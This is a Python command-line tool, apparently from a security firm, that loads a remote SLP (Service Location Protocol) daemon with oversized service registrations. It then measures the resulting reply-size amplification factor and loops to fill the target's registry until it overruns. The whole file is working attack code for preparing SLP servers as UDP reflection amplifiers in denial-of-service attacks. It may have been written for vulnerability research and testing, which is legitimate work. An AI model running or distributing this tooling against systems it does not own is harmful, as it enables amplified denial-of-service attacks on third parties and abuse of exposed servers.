#!/usr/bin/env python3

import sys
import math
import socket
import string
import random
import argparse
from libs.srvloc_proto_v2 import build_slp_svc_type_req_v2, build_slp_svc_req_v2, _slp_svc_reg_v2, _slp_svc_req_v2, \
_slp_svc_type_req_v2, _slp_svc_dereg_v2, build_slp_base_v2, SLP_SVC_DEREG, SLP_SVC_REG, compute_len_v2, SLP_SVC_REQ, \
SLP_SVC_REG,SLP_SVC_DEREG


__tool_name__ = 'slpload'
__tool_version__ = '0.4b'
__tool_author__ = 'Marco Lux (ping@curesec.com)'
__tool_date__ = 'April 2023'

def build_socket(args):
    ipv6 = args.ipv6
    host = args.host
    port = args.port
    timeout = args.timeout

    try:
        # enable ipv6 
        if ipv6:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # this keeps the same
        sock.settimeout(timeout)
        sock.connect((host, port))
    
    except Exception as e:
        print(repr(e))
        sys.exit(-1)
    
    return sock

def build_slp_svc_reg_v2(pkt2):
    pkt1 = build_slp_base_v2(slp_func=SLP_SVC_REG)

    pkt = pkt1+pkt2
    pkt_rdy = compute_len_v2(pkt)

    return pkt_rdy


def setup_reg_pkt(words, words_rand, rand_len, lifetime):
    
    
    svc_word = 'slpLoadTest'
    
    # there must not be a carriage return
    svc_word_dom = words[::-1].rstrip('\r\n')
    
    svc_ports = 31337
    
    # multiply the words_rand until we have the wanted size for the buffer

    #print(len((words_rand)) / rand_len)
    fin_size = (rand_len / int(len(words_rand)))+1
    
    # this is really *not* how it should be done
    # but i'am a bit tired
    svc_alpha_rand = words_rand
    for f in range(0, int(fin_size)):
        svc_alpha_rand = "{0}{1}".format(svc_alpha_rand,svc_alpha_rand)
    svc_alpha_rand = svc_alpha_rand[:rand_len]

    # setup the service url
    svc_url = '{0}://{1}:{2}/'.format(svc_word,svc_word_dom, svc_ports)
    
    # get the length, we need that for later substraction
    svc_url_len = len(svc_url)

    # lets substract the service name, slasshes etc. from the overall
    # length, to get a precise buffer
    svc_alpha_rand = svc_alpha_rand[:len(svc_alpha_rand)-svc_url_len-1]

    # setup the service type
    svc_type = '{0}://{1}:{2}/{3}'.format(svc_word,
                                          svc_word_dom, svc_ports, svc_alpha_rand)

    # encode the data, so it can be used with sockets
    svc_url = svc_url.encode()
    def_svc_type = svc_type.encode()
    def_svc_len = len(def_svc_type)

    # setup the registration packet
    pkt_regis = _slp_svc_reg_v2(slp_reserved=0,
                                svc_url_lifetime=lifetime,
                                svc_url_len=svc_url_len,
                                svc_url=svc_url,
                                slp_num_auth=0,
                                svc_type_len=def_svc_len,
                                svc_type=def_svc_type,
                                scope_list_len=7,
                                scope_list=b'default',
                                attr_list_len=0,
                                attr_auths=0)

    # build and return
    pkt = build_slp_svc_reg_v2(pkt_regis)
    
    return pkt

def gen_random_string(stringLength=8):
    '''
    '''
    """Generate a random string of fixed length """
    lettersAndDigits = string.ascii_letters + string.digits
    return ''.join(random.choice(lettersAndDigits) for i in range(stringLength))

def check_mode(args):
    '''
    request which services are available
    '''

    # socket timeout
    #timeout = args.timeout
    
    # setup and build socket
    sock = build_socket(args)
    
    # setup packet
    pkt = build_slp_svc_type_req_v2()
    
    # send packet
    print('[+] Sending service type  request v2...')
    sock.send(pkt)

    # non parsed response
    data = sock.recv(65535)
    pkt_len = len(data)
    # assumption is our svc type req pkt is 29 bytes
    req_len = 29
    amp_fact = pkt_len / req_len
    
    print('[+] Data Buffer: {0}'.format(repr(data)))
    print(f'[!] Host: {args.host} Buffer Size: {pkt_len} Ampfactor: {amp_fact}')

    return True

def load_mode(args):
        
    data_dict = {}
    recv_size = 65535
    pkt_size = args.size
    lifetime = args.lifetime
    #f_path = args.supply_dir
    
    # lets get some random data
    words = gen_random_string()
    words_rand = gen_random_string(128)

    # build a socket dgram
    sock = build_socket(args)

    # make register packet basics
    print('[+] Preparing packet')
    pkt = setup_reg_pkt(words, words_rand, pkt_size, lifetime)

    print('[+] Sending packet Register V2...')
    sock.send(pkt)
    try:
        ret = sock.recv(1024)

    except TimeoutError as e:
        print('[-] Packet too big? ', e)
        data_dict = {'error':'timeout'}
        return False, data_dict
    
    except Exception as e:
        #print(e)
        data_dict = {'error':repr(e)}
        return False, data_dict
    
    # output 
    #print(repr(ret))

    if ret:
        # check if svc 2 and reply
        if ret[0:2] == b'\x02\x05':
            print('[+] Registration accepted. ')
        else:
            print('[-] Uncommon response. Abort.')
            #sys.exit(-1)
            return False,data_dict
    else:
        print('[-] Loading up failed. Abort.')
        return False, data_dict

    pkt = build_slp_svc_type_req_v2()
    sock.send(pkt)
    pkt_len = 0
    new_data = b''
    while True:
        try:
            recv_data = sock.recv(recv_size)
            pkt_len = (len(recv_data)) + pkt_len
            new_data = recv_data + new_data
            data_dict = {'data':new_data,'pkt_len':pkt_len}
        except Exception as e:
            data_dict = {'data':new_data,'pkt_len':pkt_len}
            #print(repr(e))
            break
            
    
    print(f'[+] Loaded up with {pkt_len} bytes')
    #print(repr(f'{new_data}'))
    sock.close()

    return True, data_dict

def load_loop(args):
    '''
    method tests to what size a remote target is capable of taking in data
    '''
    old_val = -1
    while [ 1 ]:
        ret, res_dict = load_mode(args)
        if not ret:
            err = res_dict['error']
            # maybe packet was too big lets size it down
            if err == 'timeout':
                args.size = math.ceil(args.size * 0.9)
                print(f'New packet size {args.size}')

        else:
            # take remote buffer size
            pkt_len = (res_dict['pkt_len'])
            
            # assumption is our svc type req pkt is 29 bytes
            req_len = 29
            amp_fact = pkt_len / req_len
            
            print(f'[!] Host: {args.host} Buffer Size: {pkt_len} New Pkt Size: {args.size} Ampfactor: {amp_fact}')
            if pkt_len == old_val:
                print(f'[!] Attention Buffser Size *NOT* changed. Now: {pkt_len} Old: {old_val}')
                print('[!] This indicates overrun at SLPD side.')
            old_val = pkt_len
    return True


def run(args):
    
    mode = args.mode

    # control structure aka what shall i do?
    if mode == 'one-shot':
        load_mode(args)

  #  elif mode == 'de-reg':
  #      dereg_mode(args)

    elif mode == 'check':
        check_mode(args)
    
    elif mode == "load-test":
        load_loop(args)

    else:
        print('[-] Unknown mode. Exit.')
        sys.exit(-1)


def main():

    parser_desc = "%s %s %s in %s" % (
        __tool_name__, __tool_version__, __tool_author__, __tool_date__)
    parser = argparse.ArgumentParser(prog=__tool_name__, description=parser_desc)
    parser.add_argument('-6', '--ipv6', action='store_true', dest='ipv6', required=False,
                        help="enable ipv6 addresses")
    parser.add_argument('-l', '--host', action='store', dest='host', required=False,
                        help="host to connect to", default='localhost')
    parser.add_argument('-p', '--port', action='store', type=int, dest='port', required=False,
                        help="port to use to connect to", default=427)
    parser.add_argument('-s', '--size', action='store',type=int, dest='size', required=False,
                        help="size of data to store", default=512)
    parser.add_argument('-t', '--timeout', action='store',type=int, dest='timeout', required=False,
                        help="socket connection timeout", default=5)
    parser.add_argument('-T', '--lifetime', action='store',type=int, dest='lifetime', required=False,
                        help="lifetime of data registered as service", default=100)
    parser.add_argument('-m', '--mode', action='store', dest='mode', required=False,
                        help="choose the mode to use for slpload, for supported modes enter use as arg for -m?", default='one-shot')
    parser.add_argument('-r', '--register-svc', action='store', dest='reg_svc', required=False,
                        help="complete data string with content for service registration", default='test')

    if len(sys.argv) < 2:
        parser.print_help(sys.stderr)
        usage()
        sys.exit()

    args = parser.parse_args()
    
    if args.mode == '?':
        print('Supported modes:\n')
        print('\tone-shot - load one-time data into svc')
        print('\tload-test - try to load as much data as possible to service and calc ampfactor')
        print('\tcheck - check data in default registry')
        print()
        sys.exit(-1)
    
    run(args)

def usage():
    helpme = '''
    Single load packet stored at remote slpd:
    python slpload.py -t 2 -l <ip> -m one-shot

    Loop and try to load up the remote slpd until its filled. Use option -m "load-test":
    python slpload.py -t 2 -l <ip> -m load-test -s 1200 -T 1000
    
    Check data stored at remote site, print data and size plus amplification factor:
    python slpload.py -t 2 -l <ip> -m check

    IPV6 Support: Can you enabled by -6
    ./slpload.py -6 -l <ipv6>
    
    NOTE: -s Minimum size is 30 bytes, otherwise calculation gets incorrect. This is related to the 
    svc url / svc type fields necessary for registration. Also try to have size ~100 bytes less than 
    the MTU to avoid fragmentation. A safe maximum value is ~1300. 
    '''
    
    print(helpme)
if __name__ == "__main__":
    main()
